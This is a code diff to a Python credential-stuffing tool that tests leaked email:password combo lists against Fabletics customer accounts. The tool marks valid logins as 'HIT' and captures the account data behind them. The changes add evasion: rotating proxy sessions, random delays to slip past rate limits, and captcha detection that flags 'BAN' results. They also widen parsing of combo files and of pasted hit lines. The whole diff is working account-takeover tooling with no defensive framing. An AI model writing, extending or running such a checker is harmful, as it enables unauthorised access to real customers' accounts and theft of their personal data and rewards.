@@ -1,13 +1,14 @@
 from __future__ import annotations
 
+import os
+import random
+import time
 from dataclasses import dataclass, field
 from typing import Any
 
-import os
-
 from .client import FableticsAPIError, FableticsClient
-from .config import DEFAULT_PROXY
-from .proxy import parse_proxy
+from .config import CHECK_DELAY_MAX, CHECK_DELAY_MIN, DEFAULT_PROXY
+from .proxy import parse_proxy, with_rotating_session
 
 
 @dataclass
@@ -136,11 +137,63 @@ def capture_account_data(client: FableticsClient, token: str, login_customer: di
 _UNSET = object()
 
 
-def resolve_proxy(proxy: str | None = None) -> str | None:
+def resolve_proxy(proxy: str | None = None, *, rotate: bool = True) -> str | None:
     raw = proxy if proxy is not None else os.environ.get("FABLETICS_PROXY") or DEFAULT_PROXY
     if not raw:
         return None
-    return parse_proxy(raw)
+    parsed = parse_proxy(raw)
+    if rotate and os.environ.get("FABLETICS_ROTATE_PROXY", "1") != "0":
+        parsed = with_rotating_session(parsed)
+    return parsed
+
+
+def _pace_request() -> None:
+    delay = random.uniform(CHECK_DELAY_MIN, CHECK_DELAY_MAX)
+    time.sleep(delay)
+
+
+def _is_auth_failure(message: str) -> bool:
+    lower = message.lower()
+    return any(
+        phrase in lower
+        for phrase in (
+            "authentication failed",
+            "invalid credentials",
+            "invalid username or password",
+            "incorrect password",
+            "email or password",
+            "wrong password",
+            "user not found",
+        )
+    )
+
+
+def _is_captcha(message: str, exc: FableticsAPIError) -> bool:
+    lower = message.lower()
+    if exc.captcha_required:
+        return True
+    return "recaptcha" in lower or (
+        "captcha" in lower and "authentication" not in lower
+    )
+
+
+def _classify_api_error(exc: FableticsAPIError, email: str, password: str) -> CheckResult:
+    message = str(exc)
+    lower = message.lower()
+    if _is_captcha(message, exc):
+        return CheckResult(
+            status="BAN",
+            email=email,
+            password=password,
+            message="Captcha required",
+        )
+    if exc.retryable:
+        return CheckResult(status="RETRY", email=email, password=password, message=message)
+    if _is_auth_failure(message):
+        return CheckResult(status="FAIL", email=email, password=password, message="Invalid credentials")
+    if exc.status_code == 401 and "session required" not in lower:
+        return CheckResult(status="RETRY", email=email, password=password, message=message)
+    return CheckResult(status="ERROR", email=email, password=password, message=message)
 
 
 def check_account(
@@ -153,6 +206,7 @@ def check_account(
         resolved_proxy = resolve_proxy()
     else:
         resolved_proxy = proxy
+    _pace_request()
     client = FableticsClient(proxy=resolved_proxy, timeout=timeout)
 
     try:
@@ -160,31 +214,28 @@ def check_account(
         data = capture_account_data(client, login.access_token, login.customer)
         return CheckResult(status="HIT", email=email, password=password, data=data)
     except FableticsAPIError as exc:
-        if exc.retryable:
-            return CheckResult(
-                status="RETRY",
-                email=email,
-                password=password,
-                message=str(exc),
-            )
-
-        status_code = exc.status_code or 0
-        message = str(exc).lower()
-
-        if status_code == 403 and "authentication failed" in message:
-            return CheckResult(status="FAIL", email=email, password=password, message="Invalid credentials")
-        if status_code == 401:
-            return CheckResult(status="RETRY", email=email, password=password, message=str(exc))
-
-        return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
+        return _classify_api_error(exc, email, password)
     except Exception as exc:
         return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
+    finally:
+        client.close()
 
 
 def parse_combo(line: str) -> tuple[str, str] | None:
-    line = line.strip()
+    line = line.strip().lstrip("\ufeff")
     if not line or line.startswith("#"):
         return None
+
+    # Support pasted hit one-liners: email:pass | Points = ...
+    if " | " in line:
+        line = line.split(" | ", 1)[0].strip()
+
+    if "\t" in line and ":" not in line:
+        parts = line.split("\t", 1)
+        if len(parts) == 2:
+            email, password = parts[0].strip(), parts[1].strip()
+            if email and password and "@" in email:
+                return email, password
 
     if ":" not in line:
         return None
@@ -192,6 +243,6 @@ def parse_combo(line: str) -> tuple[str, str] | None:
     email, password = line.split(":", 1)
     email = email.strip()
     password = password.strip()
-    if not email or not password:
+    if not email or not password or "@" not in email:
         return None
     return email, password
